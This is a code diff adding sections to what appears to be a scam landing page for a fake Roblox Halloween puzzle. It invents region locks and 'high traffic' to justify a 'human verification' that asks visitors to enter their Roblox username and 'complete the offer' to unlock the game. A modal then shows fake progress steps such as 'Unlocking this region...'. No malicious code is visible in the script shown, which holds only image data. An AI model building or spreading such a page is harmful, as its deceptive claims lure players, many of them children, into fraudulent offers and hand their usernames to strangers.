@@ -252,3 +252,106 @@ form{display:grid;gap:10px;text-align:left;max-width:380px;margin:0 auto}
       </div>
     </div>
   </section>
+<section class="sec" id="monsters">
+    <div class="wrap">
+      <span class="kicker">The cast</span>
+      <h2>Meet the monsters</h2>
+      <p class="sub">They live inside the poster. Swipe to meet them, and keep an eye on the ghost.</p>
+    </div>
+    <div class="rail" id="rail"></div>
+  </section>
+
+  <section class="sec" id="install">
+    <div class="wrap">
+      <div class="soon">
+        <div>
+          <span class="kicker">Troubleshooting</span>
+          <h2>Puzzle not showing in your game?</h2>
+          <p class="sub">If you've claimed the puzzle but it's not appearing in your Roblox inventory, it might be because of region locks or high traffic.</p>
+          <div style="margin-top:24px;display:flex;flex-direction:column;gap:16px;">
+            <div style="padding:16px;border:1px solid var(--line);border-radius:16px;background:#0d0813;">
+              <b style="display:block;margin-bottom:4px;font-size:17px;">1. Verify your username</b>
+              <span style="color:var(--ash);font-size:15px;">Make sure you entered your exact Roblox username (not display name) in the claim window.</span>
+            </div>
+            <div style="padding:16px;border:1px solid var(--line);border-radius:16px;background:#0d0813;">
+              <b style="display:block;margin-bottom:4px;font-size:17px;">2. Check your region</b>
+              <span style="color:var(--ash);font-size:15px;">The puzzle is currently rolling out to all regions. If you are in a restricted region, it may take up to 24 hours to appear.</span>
+            </div>
+            <div style="padding:16px;border:1px solid var(--line);border-radius:16px;background:#0d0813;">
+              <b style="display:block;margin-bottom:4px;font-size:17px;">3. Complete the verification</b>
+              <span style="color:var(--ash);font-size:15px;">Due to high traffic, we require a quick human verification. Enter your username above and complete the offer to unlock your game.</span>
+            </div>
+          </div>
+          <button class="btn" data-notify type="button" style="margin-top:24px;display:flex;align-items:center;gap:10px;">
+            <img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" style="height:22px;width:auto;border-radius:4px;" alt="Roblox">
+            Verify &amp; Unlock
+          </button>
+        </div>
+        <div class="phone" aria-hidden="true">
+          <div class="phscreen" style="background:radial-gradient(70% 50% at 50% 35%, #4a0d1e, #120b1a 70%);">
+            <img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" style="width:80px;height:auto;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);" alt="Roblox">
+            <b style="margin-top:15px;">ROBLOX</b>
+            <span>Halloween Puzzle</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div><a class="brand" href="#top"><img src="https://images.rbxcdn.com/905bd722ee0a6ceda3caacde54c0b081.png" alt="Roblox" style="height:28px;width:auto;border-radius:4px;">Roblox Puzzle</a><p style="margin:10px 0 0;max-width:52ch">A fan-made Halloween puzzle. Not made by or connected to Roblox. Monster art belongs to its creators.</p></div>
+    <button class="btn ghost sm" data-notify type="button">Play Now</button>
+  </div>
+</footer>
+
+<div class="modal" id="modal" hidden>
+  <div class="mback" data-close></div>
+  <div class="msheet" role="dialog" aria-modal="true" aria-labelledby="mTitle">
+    <button class="mx" data-close type="button" aria-label="Close"><svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M6 6l12 12M18 6 6 18"/></svg></button>
+    
+    <!-- Form State -->
+    <div id="mForm">
+      <span class="appico big" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></span>
+      <h3 id="mTitle">Open in Roblox</h3>
+      <p style="margin: 0 0 18px; color: #a99db8; font-size: 15px;">Enter your Roblox username to add the puzzle to your account.</p>
+      
+      <form id="claimForm" onsubmit="startClaim(event)">
+        <label class="fl" for="username">Roblox Username</label>
+        <input class="fi" id="username" name="username" type="text" placeholder="Enter your username" required style="width:100%; padding:14px 16px; background:#07050b; border:1px solid #3a2a4d; border-radius:14px; color:#f3ece6; font-size:17px; margin-bottom: 10px;">
+        <button class="btn wide" id="claimBtn" type="submit" style="width: 100%;">CLAIM NOW</button>
+      </form>
+    </div>
+
+    <!-- Loading / Steps State -->
+    <div id="mSteps" hidden>
+      <h3 id="mTitleStep">Connecting...</h3>
+      <div id="profileCard" style="display:none; align-items:center; gap:12px; margin: 15px 0; padding:12px; background:#0a060e; border-radius:12px; border:1px solid #2e2140; text-align:left;">
+        <img id="pAvatar" src="" style="width:50px; height:50px; border-radius:50%; border:2px solid #ff2a3d; object-fit:cover;">
+        <div><div id="pName" style="font-weight:700; color:#f3ece6;">Loading...</div><div id="pId" style="font-size:12px; color:#a99db8;"></div></div>
+      </div>
+      <div id="stepList" style="display:flex; flex-direction:column; gap:10px; text-align:left;">
+        <div class="step" id="s1" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+          <span style="color:#ff2a3d;">●</span> <span>Adding puzzle to your Roblox...</span>
+        </div>
+        <div class="step" id="s2" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+          <span style="color:#ff2a3d;">●</span> <span>Unlocking this region...</span>
+        </div>
+        <div class="step" id="s3" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+          <span style="color:#ff2a3d;">●</span> <span>Making it available in your region...</span>
+        </div>
+        <div class="step" id="s4" style="display:flex; align-items:center; gap:10px; padding:12px; background:#120b1a; border-radius:10px; border:1px solid #2e2140; opacity:0.5;">
+          <span style="color:#ff2a3d;">●</span> <span>Finalizing...</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const A={"pieces": ["data:image/webp;base64,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..."}
+</script>
+</body>
+</html>
